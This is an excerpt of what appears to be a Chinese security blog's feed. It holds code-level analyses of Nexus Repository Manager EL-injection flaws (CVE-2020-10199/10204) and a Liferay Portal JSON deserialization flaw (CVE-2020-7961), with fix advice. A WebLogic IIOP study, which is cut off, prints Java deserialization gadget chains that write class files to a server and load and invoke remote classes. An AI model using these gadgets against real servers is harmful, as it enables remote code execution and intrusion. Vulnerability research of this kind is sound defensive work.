title="影响范围"></a>影响范围</h4><p>Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>下载 Docker 镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sonatype/nexus3:3.21.1</span><br></pre></td></tr></table></figure><p>创建 nexus 数据存储目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /your-dir/nexus-data</span><br></pre></td></tr></table></figure><p>运行 Docker 镜像，并且开启调试端口，其中 8081 为 web 访问端口，5050 端口为远程调试端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --rm -p 8081:8081 -p 5050:5050 --name nexus -v /your-dir/nexus-data:/nexus-data -e INSTALL4J_ADD_VM_PARAMS=&quot;-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g  -Djava.util.prefs.userRoot=/nexus-data -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050&quot; sonatype/nexus3:3.21.1</span><br></pre></td></tr></table></figure><p>下载 Nexus 源码，并且切换至 <code>3.21.0-05</code> 分支：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sonatype/nexus-public.git</span><br><span class="line">git checkout -b release-3.21.0-05 origin/release-3.21.0-05</span><br></pre></td></tr></table></figure><p>IDEA 导入项目并且配置远程调试信息：</p><p><img src="https://img.zhiiyun.com/blog_0eb69cb49bda39663620b3006230942c" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="CVE-2020-10199-1"><a href="#CVE-2020-10199-1" class="headerlink" title="CVE-2020-10199"></a>CVE-2020-10199</h3><p>该漏洞主要是因为  <code>HelperBean</code> 的 <code>message</code>  并做 EL表达式过滤，导致出现 RCE 漏洞。根据作者作者描述，作者发现如果可控的数据进入到 <code>createViolation</code> 函数将会调用 <code>buildConstraintViolationWithTemplate</code> 执行EL表达式，在 <code>org.sonatype.nexus.repository.rest.api.AbstractGroupRepositoriesApiResource#validateGroupMembers:97</code> 中 <code>createViolation</code> 会调用执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private void validateGroupMembers(T request) &#123;</span><br><span class="line">  String groupFormat = request.getFormat();</span><br><span class="line">  Set&lt;ConstraintViolation&lt;?&gt;&gt; violations = Sets.newHashSet();</span><br><span class="line">  Collection&lt;String&gt; memberNames = request.getGroup().getMemberNames();</span><br><span class="line">  for (String repositoryName : memberNames) &#123;</span><br><span class="line">    Repository repository = repositoryManager.get(repositoryName);</span><br><span class="line">    if (nonNull(repository)) &#123;</span><br><span class="line">      String memberFormat = repository.getFormat().getValue();</span><br><span class="line">      if (!memberFormat.equals(groupFormat)) &#123;</span><br><span class="line">        violations.add(constraintViolationFactory.createViolation(&quot;memberNames&quot;,</span><br><span class="line">            &quot;Member repository format does not match group repository format: &quot; + repositoryName));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      violations.add(constraintViolationFactory.createViolation(&quot;memberNames&quot;,</span><br><span class="line">          &quot;Member repository does not exist: &quot; + repositoryName));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  maybePropagate(violations, log);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>GolangGroupRepositoriesApiResource</code> 继承 <code>AbstractGroupRepositoriesApiResource</code> 符合，在执行 <code>createRepository</code> 或 <code>updateRepository</code> 会利用到 <code>validateGroupMembers</code> 从而触发漏洞：</p><p><img src="https://img.zhiiyun.com/blog_ae8b11d1407b4c74472e15cdd095c5ce" alt=""></p><p>其中 <code>@path</code> 为请求路径，通过变量拼接可以得出完整的路径为 <code>beta/repositories/go/group</code> 也可以通过 <code>Java Enterprise</code> 可以看到请求路径为 <code>beta/repositories/go/group</code>。</p><p><img src="https://img.zhiiyun.com/blog_14e7d4c80edbfa56dc692a7f02710736" alt=""></p><p><img src="https://img.zhiiyun.com/blog_a73776cdf58b3258ef65fa557c26148c" alt=""></p><p>通过查看 swagger 可以看到请求的 Base URL 为 <code>/service/rest/</code> ，最后得出请求的完整链接为 <code>/service/rest/beta/repositories/go/group</code>。</p><p><img src="https://img.zhiiyun.com/blog_3978d8601587635f08af326c2f84fe9b" alt=""></p><p>最后发起请求执行命令：</p><p><img src="https://img.zhiiyun.com/blog_b1303562f2ed7e7c7cf0672a03e40455" alt=""></p><h4 id="memberNames参数为什么-String-需要变成-Array"><a href="#memberNames参数为什么-String-需要变成-Array" class="headerlink" title="memberNames参数为什么 String 需要变成 Array"></a>memberNames参数为什么 String 需要变成 Array</h4><p>可以看到请求的参数为 <code>GolangGroupRepositoryApiRequest</code> 类，该类中请求的参数 <code>group</code> 类型为 <code>GroupAttributes</code>。</p><p><img src="https://img.zhiiyun.com/blog_11815548dfdb344e7c2b370c49af2b21" alt=""></p><p><img src="https://img.zhiiyun.com/blog_5ef6c3e987cbf260e8afdcf663452bbf" alt=""></p><p>可以看到在 <code>GroupAttributes</code> 构造方法中需要一个参数名称为 <code>memberNames</code> 属性，该属性的类型为<br><code>Collection&lt;String&gt;</code>。</p><p><img src="https://img.zhiiyun.com/blog_82fb5aa86f523cf4341113750976c872" alt=""></p><p>通过查看 <code>Collection</code> 的继承链可以看到在有 <code>List</code>、<code>Set</code>、<code>Queue</code> 等继承，也就是说在请求的参数为其中继承某一个类型就可以实现。</p><p><img src="https://img.zhiiyun.com/blog_1cb6bca530769962ad130dfc25d1f969" alt=""></p><p>回到正题，为什么 <code>String</code> 类型的不行，查看 <code>String</code> 类，源代码可以看到 <code>String</code> 并未继承 <code>Collection</code> 所以无法正常使用。</p><p><img src="https://img.zhiiyun.com/blog_655dffa35cbfd001833092feeea018eb" alt=""></p><h3 id="CVE-2020-10204-1"><a href="#CVE-2020-10204-1" class="headerlink" title="CVE-2020-10204"></a>CVE-2020-10204</h3><p>CVE-2020-10204 为 <a href="https://github.com/Cryin/Paper/blob/master/CVE-2018-16621%20Nexus%20Repository%20Manager3%20%E4%BB%BB%E6%84%8FEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md" target="_blank" rel="noopener"><code>CVE-2018-16621</code></a> 的绕过，官方在修复的漏洞采用的方案是新增 <code>org.sonatype.nexus.common.template.EscapeHelper.stripJavaEl:81</code> 对用户输入roles参数进行过滤，正则匹配的结果是将‘${’替换为‘{ ’，从而防止EL表达式注入，代码片段如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Strip java el start token from a string</span><br><span class="line"> * @since 3.14</span><br><span class="line"> */</span><br><span class="line">public String stripJavaEl(final String value) &#123;</span><br><span class="line">  if (value != null) &#123;</span><br><span class="line">    return value.replaceAll(&quot;\\$+\\&#123;&quot;, &quot;&#123;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>漏洞触发主要是由于 <code>org.sonatype.nexus.security.privilege.PrivilegesExistValidator</code> 和 <code>org.sonatype.nexus.security.role.RolesExistValidator</code> 类中，会将没有找到的 privilege 或 role 放入错误模板中，而在错误模板在渲染的时候会提取其中的<code>EL表达式</code>并执行。</p><p><img src="https://img.zhiiyun.com/blog_3992887f554cd4552e3bda7765bb7089" alt=""></p><p><img src="https://img.zhiiyun.com/blog_261b858ce8a2538ca430c14faf463a93" alt=""></p><p>最后发起请求执行命令：</p><p><img src="https://img.zhiiyun.com/blog_6fb65e49b221f7ac73d4588cbe83616e" alt=""></p><h3 id="EL表达式执行流程"><a href="#EL表达式执行流程" class="headerlink" title="EL表达式执行流程"></a>EL表达式执行流程</h3><p>进入 <code>EL表达式</code> 流程之后会通过<code>org.hibernate.validator.internal.engine.constraintvalidation.ConstraintTree#validateConstraints</code>  进行校验表达式，然后通过 <code>addConstraintFailure</code>  进行添加 <code>validationContext</code>。</p><p><img src="https://img.zhiiyun.com/blog_6a2a9f8d7f3015235ed3fc1457b65379" alt=""></p><p>跟进 <code>addConstraintFailure</code> 之后可以看到 <code>messageTemplate</code> 为我们提交的 <code>EL表达式</code> 信息，然后通过 <code>this.interpolate</code> 进行执行该表达式。</p><p><img src="https://img.zhiiyun.com/blog_c50065e1c4d2729369ada30acaeb5cc1" alt=""></p><p>跟进 <code>this.interpolate</code> 可以看到通过 <code>this.validatorScopedContext.getMessageInterpolator().interpolate(messageTemplate, context);</code> 进行执行，其中 <code>messageTemplate</code> 参数为我们提交的 <code>EL表达式</code> 。</p><p><img src="https://img.zhiiyun.com/blog_0bd7963fd5927472026f5cb8964b7b76" alt=""></p><p>跟进 <code>org.hibernate.validator.messageinterpolation.AbstractMessageInterpolator#interpolate</code> 之后，将提交的 <code>EL表达式</code> 作为参数交由 <code>this.interpolateMessage(message, context, this.defaultLocale);</code> 处理。</p><p><img src="https://img.zhiiyun.com/blog_13a3fd4a69d35ce0de2a137f00fc463e" alt=""></p><p>继续跟进 <code>org.hibernate.validator.messageinterpolation.AbstractMessageInterpolator#interpolateMessage</code> 然后通过 <code>this.interpolateExpression</code> 进行针对表达式进行处理，然后将处理结果赋值给 <code>resolvedMessage</code>，并且作为参数再次处理表达式。</p><p><img src="https://img.zhiiyun.com/blog_11491d445bae76de45fb80353c3e3ade" alt=""></p><p><img src="https://img.zhiiyun.com/blog_0813c1cba82cca610da84619215411b5" alt=""></p><p>此时执行的代码为 <code>this.interpolateExpression(new TokenIterator(this.getParameterTokens(resolvedMessage, this.tokenizedELMessages, InterpolationTermType.EL)), context, locale);</code> 跟进代码可以看到 <code>isEL=True</code>，然后通过 <code>this.interpolate</code> 处理。</p><p><img src="https://img.zhiiyun.com/blog_867b6d47394d000e4edcccaf9fb71b8a" alt=""></p><p>跟进 <code>org.hibernate.validator.messageinterpolation.ResourceBundleMessageInterpolator#interpolate:83</code> 可以看到已经将我们提交的 <code>EL表达式</code> 实例化为 EL 类型对象。</p><p><img src="https://img.zhiiyun.com/blog_1337f2653c8c9b3810aa8445cab34aa4" alt=""></p><p>最后通过 <code>org.hibernate.validator.internal.engine.messageinterpolation.ElTermResolver#interpolate</code> 方法中的 <code>resolvedExpression = (String)valueExpression.getValue(elContext);</code> 进行执行表达式，然后将执行结果转换为 <code>String</code> 类型结果内容进行响应。</p><p><img src="https://img.zhiiyun.com/blog_696be39fc70fe24cbcc9238112f0f962" alt=""></p><p>以下为整个的调用链条：</p><p><img src="https://img.zhiiyun.com/blog_74d83350cfdb5fe398848351c2bedcaa" alt=""></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>升级至最新版本或 Nexus Repository Manager 3.x OSS / Pro &gt; 3.21.1</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li style="list-style: none"><input type="checkbox" checked> <a href="https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype" target="_blank" rel="noopener">GHSL-2020-011: Remote Code Execution - JavaEL Injection (low privileged accounts) in Nexus Repository Manager</a></li><li><a href="https://hu3sky.github.io/2020/04/08/CVE-2020-10204_CVE-2020-10199:%20Nexus%20Repository%20Manager3%20%E5%88%86%E6%9E%90&amp;%E4%BB%A5%E5%8F%8A%E4%B8%89%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/#%E5%9B%9E%E6%98%BE" target="_blank" rel="noopener">CVE-2020-10204/CVE-2020-10199 Nexus Repository Manager3 分析&amp;以及三个类的回显构造</a></li><li><a href="https://www.cnblogs.com/magic-zero/p/12641068.html" target="_blank" rel="noopener">Nexus Repository Manager(CVE-2020-10199/10204)漏洞分析及回显利用方法的简单讨论</a></li><li><a href="https://github.com/threedr3am/learnjavabug/tree/master/nexus/CVE-2020-10199" target="_blank" rel="noopener">CVE-2020-10199</a></li><li><a href="https://github.com/threedr3am/learnjavabug/tree/master/nexus/CVE-2020-10204" target="_blank" rel="noopener">CVE-2020-10204</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> Nexus Repository Manager </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liferay Portal CVE-2020-7961 分析</title>
      <link href="/posts/a86ea905/"/>
      <url>/posts/a86ea905/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>近日有 Code White 安全团队发现关于 Liferay Portal 多个比较严重的 JSON fan 反序列化漏洞，影响 Liferay Portal 6.1、6.2、7.0、7.1 以及 7.2 版本，这些漏洞可以通过 Json web 进行未授权远程代码执行。固定版本为 6.2 GA6、7.0 GA7、7.1 GA4 和 7.2 GA2。<br>对应的漏洞分别是：</p><ul><li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/113765197" target="_blank" rel="noopener">CST-7111: 通过JSON反序列化实现RCE (LPS-88051/LPE-16598)</a><br>在Liferay Portal 6.1和6.2中，Flexjson 库用于序列化和反序列化数据。它支持对象绑定，对任何带有无参数构造函数的类将使用被初始化对象的 <code>setter</code> 方法。类的规范是通过class对象键：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;class&quot;:&quot;fully.qualified.ClassName&quot;, ... &#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>该漏洞于 2018 年 12 月被报告，已在企业版中被修复，包括 6.1 EE GA3 fixpack 71 和 6.2 EE GA2 fixpack 1692 和 6.2 GA6。</p><ul><li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271" target="_blank" rel="noopener">CST-7205: 通过JSONWS实现远程代码执行 (LPS-97029/CVE-2020-7961)</a><br><code>JSONWebServiceActionParametersMap</code> Liferay  Portal 的允许任意类和任意 <code>setter</code> 方法调用的实例。</li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>环境信息：</p><ul><li>操作系统： Mac OS</li><li>JDK：1.8.0_171</li><li>调试工具：Idea</li><li>部署：Tomcat-9.0.17</li><li>Liferay  Portal：<a href="https://jaist.dl.sourceforge.net/project/lportal/Liferay Portal/7.2.0 GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz" target="_blank" rel="noopener">liferay-ce-portal-tomcat-7.2.0-ga1</a></li></ul><p>配置 Tomcat 调试端口，修改 <code>tomcat/bin/setenv.sh</code> (windows 为 setenv.bat) 文件加入<code>export JPDA_ADDRESS=0.0.0.0:5555</code> (windows 为 <code>set JPDA_ADDRESS=0.0.0.0:5555</code>)，其中<code>5555</code> 为远程调试端口，<code>0.0.0.0</code> 表示可连接调试端口的 IP 地址。</p><p>将整个项目作作为调试运行目录，将 <code>tomcat-9.0.17/webapps/ROOT/WEB-INF/lib</code> 目录添加 <code>Libraries</code> ：</p><p><img src="https://img.zhiiyun.com/blog_372ec8575694ab12692e09c93b71c2d7" alt=""></p><p>配置 <code>Remote</code> 方式进行远程调试，ip 设置为开启 tomcat 调试服务的 IP，端口为 <code>5555</code>：</p><p><img src="https://img.zhiiyun.com/blog_cbc0d6d6f3d3282878cdb4d11b603827" alt=""></p><p><strong>注：Tocmat 运行命令为 <code>./catalina.sh jpda start</code> 使用调试模式运行。</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>Liferay Portal 提供了一个全面的 JSON Web 服务 API ，并提供了三种不同的调用Web服务方法的示例：</p><ul><li><p>通过通用URL <code>/api/jsonws/invoke</code>，其中服务方法及其参数通过POST作传输，一个JSON对象或基于表单的参数。</p></li><li><p>通过服务方法特定的 URL ，例如 <code>/api/jsonws/service-class-name/service-method-name</code> ，其中参数传递是通过基于表单的 <code>POST</code> 数据包。</p></li><li><p>通过服务方法特定的URL，例如 <code>/api/jsonws/service-class-name/service-method-name</code>，其中参数也是通过URL的形式传递，例如 <code>/api/jsonws/service-class-name/service-method-name/arg1/val1/arg2/val2/…</code> 。</p></li></ul><p>在 Liferay Portal  主要在 <code>/tomcat-9.0.17/webapps/ROOT/WEB-INF/lib/portal-impl.jar</code>文件中<code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSON:43</code>  进行处理 JSON 请求然后交由<code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSONWebServiceAction:115</code> 来进行处理 Json API。</p><p><img src="https://img.zhiiyun.com/blog_09a7e0ebb5901e67c6e3f69a4b2014f5" alt=""></p><p><img src="https://img.zhiiyun.com/blog_4e147b1af4ed367b9c16baefc7c35f90" alt=""></p><p>然后会通过 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionsManagerImpl#getJSONWebServiceAction:74</code> 进行对请求对参数进行来进行遍历处理。</p><p><img src="https://img.zhiiyun.com/blog_ac52c7895038da0b46e4890b4b0cfece" alt=""><br><code>com.liferay.portal.jsonwebservice.JSONWebServiceActionParameters#collectAll:50</code> 中 <code>this._collectFromRequestParameters(httpServletRequest);</code> 来进行处理请求参数。<br><img src="https://img.zhiiyun.com/blog_4b10ff84ed43512af11ac3c7685eae99" alt=""></p><p><code>com.liferay.portal.jsonwebservice.JSONWebServiceActionParameters._collectFromRequestParameters;170</code> 首先会将参数转换为 <code>Set</code> 类型，然后进行迭代循环，最后通过 <code>this._jsonWebServiceActionParameters.put(parameterName, value);</code>。</p><p><img src="https://img.zhiiyun.com/blog_4b259f423c647936de93b3761ef3ba6c" alt=""></p><p><img src="https://img.zhiiyun.com/blog_c9fde0bac4bced9b91bb8c534fd736f3" alt=""></p><p><img src="https://img.zhiiyun.com/blog_68560b5182d04114e3a8a45afeda19d8" alt=""></p><p>跟踪进入会跳入 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionParametersMap#put:48</code> 中并且将参数名称以及值进行传入，并且判定参数名是否包含 <code>:</code>  ( char 58 表示为 <code>:</code>) ，然后通过 <code>this._parameterTypes.put(key, typeName);</code> 将 <code>:</code> 之前的内容作为 <code>key</code> 以及 <code>:</code> 之后的内容作为类型添加至 <code>this._parameterTypes</code> 变量中。</p><p><img src="https://img.zhiiyun.com/blog_cb070b178221c5a1d35377604e94408a" alt=""></p><p><img src="https://img.zhiiyun.com/blog_3a47787b4f7d8849c3b3d43b8195e8a6" alt=""></p><p><img src="https://img.zhiiyun.com/blog_75a2fffaba0c3320bb221af161811db6" alt=""></p><p><code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSONWebServiceAction</code> 执行完毕会跳回 <code>com.liferay.portal.jsonwebservice.JSONWebServiceServiceAction#getJSON</code> 并且执行 <code>jsonWebServiceAction.invoke()</code>。</p><p><img src="https://img.zhiiyun.com/blog_25be29acacfdf8dd1da980c050376195" alt=""></p><p>跟进 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#invoke:54</code> 然后会执行 <code>this._invokeActionMethod();</code>。</p><p><img src="https://img.zhiiyun.com/blog_649e258a36579357e481496074ae9679" alt=""></p><p>进入 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_invokeActionMethod</code> 之后，将<code>actionClass</code> 作为参数调用  <code>thiis._prepareParameters(actionClass);:316</code> 。</p><p><img src="https://img.zhiiyun.com/blog_488c4b6c02e01e5fde526d27d6342321" alt=""></p><p>跟进 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_prepareParameters</code> 之后会通过 <code>this._jsonWebServiceActionConfig.getMethodParameters()</code> 获取请求方法参数，然后进行循环根据指定类载入的参数名与请求包中的参数名进行赋值，然后根据载入类中参数的类型。如果通过 <code>this._jsonWebServiceActionParameters.getParameter(parameterName);</code> 提取到内容信息会通过 <code>this._jsonWebServiceActionParameters.getParameterTypeName(parameterName);</code> 进行获取请求参数类型，也就是 <code>:</code> 之后的内容，并且通过 ClassLoader 获取该类的 class。</p><p><img src="https://img.zhiiyun.com/blog_af63a6b0ffe5a7016f38f607b7b3a9d2" alt=""></p><p>获取到该类的 Class 之后，会通过 <code>parameterValue = this._convertValueToParameterValue(value, parameterType, methodParameters[i].getGenericTypes());</code> 将内容转换为参数类型对象。</p><p><img src="https://img.zhiiyun.com/blog_4ca4159b2e6a9e56371cf2b6fc6926e7" alt=""></p><p>跟踪进入 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_convertValueToParameterValue</code> 之后会跳入 <code>com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_convertType</code> 中进行类型转换，在转换的过程中会进行抛出异常，通过捕获异常之后会进行判定是否为 <code>Map</code> 并且是 <code>{</code> 开头的字符串，然后进行反序列化执行恶意代码。</p><p><img src="https://img.zhiiyun.com/blog_bf03027e5eddf5da8cca7ca763d530f1" alt=""></p><p><img src="https://img.zhiiyun.com/blog_942594a1439dff5bc98e6d5ffda19e1f" alt=""></p><p><img src="https://img.zhiiyun.com/blog_07736f5d3bf3a45a0109cae28f22e1a3" alt=""></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>修复版本：6.2 GA6、7.0 GA7、7.1 GA4 和 7.2 GA。</p><p>目前官方已发布了安全补丁，可通过 <a href="https://liferay.dev/blogs/-/blogs/security-patches-for-liferay-portal-6-2-7-0-and-7-1" target="_blank" rel="noopener">https://liferay.dev/blogs/-/blogs/security-patches-for-liferay-portal-6-2-7-0-and-7-1</a> 进行相应版本的下载。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://nosec.org/home/detail/4376.html" target="_blank" rel="noopener">【安全通报】Liferay Portal中的RCE漏洞</a></li><li><a href="https://www.javaweb.org.cn/3255.shtml" target="_blank" rel="noopener">CVE-2020-7961 水文一篇</a></li><li><a href="https://github.com/mzer0one/CVE-2020-7961-POC" target="_blank" rel="noopener">https://github.com/mzer0one/CVE-2020-7961-POC</a></li><li><a href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html" target="_blank" rel="noopener">Liferay Portal JSON Web Service RCE Vulnerabilities</a></li><li><a href="https://twitter.com/chybeta/status/1242133506974560256" target="_blank" rel="noopener">https://twitter.com/chybeta/status/1242133506974560256</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> Liferay Portal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic IIOP漏洞的回显构造研究</title>
      <link href="/posts/51fa2b96/"/>
      <url>/posts/51fa2b96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>首先要理解该漏洞的话，先要知道几点：</p><ol><li>什么是IIOP协议</li><li>什么是RMI协议</li><li>这两个协议之间有什么区别</li></ol><p>这几点可自行搜索查看，在先知中也有不少例子。</p><h2 id="0x02-回显分析"><a href="#0x02-回显分析" class="headerlink" title="0x02 回显分析"></a>0x02 回显分析</h2><p>在我这个菜鸡理解的IIOP和RMI协议区别是没什么区别反正都是远程调用对象，所以就用RMI写了个远程执行命令的HelloWord来做了个实验。</p><p>编写RMI过程步骤</p><p>1、一个必须继承Remote的接口并且抛出RemoteException异常</p><p><img src="http://img.zhiiyun.com/blog_1868646ef0d86562ab3f053b9510f9dd" alt=""></p><p>2、引用并实现该接口</p><p><img src="https://img.zhiiyun.com/blog_4dbdfe80de7a4b2596d2856281b7268a" alt=""></p><p>3、服务端开启远程调用并且实现绑定该接口</p><p><img src="https://img.zhiiyun.com/blog_f8604b9f5b63fc9557377d290dbae139" alt=""></p><p>4、客户端直接远程调用该接口</p><p><img src="https://img.zhiiyun.com/blog_43ae797113122666725fd7df9935d2a7" alt=""></p><p>5、最后执行效果</p><p><img src="https://img.zhiiyun.com/blog_d43d917eae7b913ddd9e3357aca82780" alt=""></p><p>可以看到通过手动写的RMI调用的例子上是可以实现RMI回显的,既然RMI和IIOP都一样那么在IIOP中是否也能通过这种方式回显呢，要在Weblogic中实现此方法回显，也要跟RMI一样要一个符合要求的接口，要一个实现该接口的恶意类，然后进行绑定，因为在 weblogic 中 7001 端口是多中协议包括 IIOP，所以就不行开启远程端口，只需要绑定上即可。</p><p>那么第一步开始查找 weblogic 中查找可以远程调用的接口，最终在weblogic发现了完美符合要求的一个类。</p><p><img src="https://img.zhiiyun.com/blog_ee2e94ef2e9f4b067839c22f91d98d26" alt=""></p><p>第二步引用并且实现该类，在经过查找后并没有发现可以实现该类的方法，想了想在weblogic一些版本中是存在 CommonsCollections3.1 的这个版本中是存在可利用的反序列化 gadget 的，想了一下可以通过写一个实现实现该类的方法写入到服务器本地然后绑定该类实现调用，在默认 ysoserial 中是没有写文件的 gedget 的所以就要修改一个如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;new ConstantTransformer(FileOutputStream.class),</span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;</span><br><span class="line">                        , new Class[]&#123;Class[].class&#125;</span><br><span class="line">                        , new Object[]&#123;new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;newInstance&quot;</span><br><span class="line">                        , new Class[]&#123;Object[].class&#125;</span><br><span class="line">                        , new Object[]&#123;new Object[]&#123;path&#125;&#125;), //绝对路径</span><br><span class="line">                new InvokerTransformer(&quot;write&quot;</span><br><span class="line">                        , new Class[]&#123;byte[].class&#125;</span><br><span class="line">                        , new Object[]&#123;classBytes&#125;)&#125;; //写入class类的bytes</span><br></pre></td></tr></table></figure><p>通过此方法写入进去了实现远程调用接口的类，接下来就是绑定，但是已有的poc中直接绑定肯定是不行的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, object), Remote.class);</span><br><span class="line">   initialContext.rebind(&quot;testets&quot;,remote);</span><br></pre></td></tr></table></figure><p>在与之前 Hello 对比</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello h=(Hello) UnicastRemoteObject.exportObject(hello,1099);</span><br><span class="line">registry.bind(&quot;Hello&quot;,h);</span><br></pre></td></tr></table></figure><p>明显是不同的没有办法直接绑定写入那个实现接口的那个恶意类，后来想了一个思路就是通过在恶意类里直接写一个绑定的方法，然后通过利用CommonsCollections3的gadget改成执行那个恶意类里的方法来绑定实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(java.net.URLClassLoader.class)</span><br><span class="line">                , new InvokerTransformer(&quot;getConstructor&quot;</span><br><span class="line">                , new Class[]&#123;Class[].class&#125;</span><br><span class="line">                , new Object[]&#123;new Class[]&#123;URL[].class&#125;&#125;)</span><br><span class="line">                , new InvokerTransformer(&quot;newInstance&quot;</span><br><span class="line">                , new Class[]&#123;Object[].class&#125;</span><br><span class="line">                , new Object[]&#123;new Object[]&#123;new URL[]&#123;new URL(ClassPath)&#125;&#125;&#125;)//加载绝对路径的class</span><br><span class="line">                , new InvokerTransformer(&quot;loadClass&quot;</span><br><span class="line">                , new Class[]&#123;String.class&#125;</span><br><span class="line">                , new Object[]&#123;className&#125;)  //加载该类的名称</span><br><span class="line">                , new InvokerTransformer(&quot;getMethod&quot;</span><br><span class="line">                , new Class[]&#123;String.class, Class[].class&#125;</span><br><span class="line">                , new Object[]&#123;method, new Class[]&#123;String.class&#125;&#125;) //反射执行该类的方法</span><br><span class="line">                , new InvokerTransformer(&quot;invoke&quot;</span><br><span class="line">                , new Class[]&#123;Object.class, Object[].class&#125;</span><br><span class="line">                , new Object[]&#123;null, new String[]&#123;&quot;&quot;&#125;&#125;)&#125;;  //要执行的参数</span><br></pre></td></tr></table></figure><p>至于如何在本类绑定调用可以用 <code>Context ctx = new 